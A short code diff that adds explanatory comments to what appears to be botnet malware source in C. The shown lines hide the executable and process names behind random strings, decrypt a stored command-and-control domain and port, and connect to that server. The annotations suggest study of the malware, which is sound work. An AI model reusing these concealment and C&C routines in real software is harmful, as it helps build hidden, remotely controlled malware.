@@ -129,13 +129,13 @@ int main(int argc, char **args)
     name_buf_len = ((rand_next() % 4) + 3) * 4;
     rand_alphastr(name_buf, name_buf_len);
     name_buf[name_buf_len] = 0;
-    util_strcpy(args[0], name_buf);
+    util_strcpy(args[0], name_buf);             // to hide the exe file  name using random name
 
     // Hide process name
     name_buf_len = ((rand_next() % 6) + 3) * 4;
     rand_alphastr(name_buf, name_buf_len);
     name_buf[name_buf_len] = 0;
-    prctl(PR_SET_NAME, name_buf);
+    prctl(PR_SET_NAME, name_buf);               // to hide the process name using random name
 
     // Print out system exec
     table_unlock_val(TABLE_EXEC_SUCCESS);
@@ -360,7 +360,7 @@ static void resolve_cnc_addr(void)
     struct resolv_entries *entries;
 
     table_unlock_val(TABLE_CNC_DOMAIN);
-    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
+    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));    // decrypt C&C domain
     table_lock_val(TABLE_CNC_DOMAIN);
     if (entries == NULL)
     {
@@ -373,7 +373,7 @@ static void resolve_cnc_addr(void)
     resolv_entries_free(entries);
 
     table_unlock_val(TABLE_CNC_PORT);
-    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
+    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));  // decrypt C&C server port
     table_lock_val(TABLE_CNC_PORT);
 
 #ifdef DEBUG
@@ -399,7 +399,7 @@ static void establish_connection(void)
 
     // Should call resolve_cnc_addr
     if (resolve_func != NULL)
-        resolve_func();
+        resolve_func();             // decrypt the C&C domain and port, put the info to srv_addr
 
     pending_connection = TRUE;
     connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
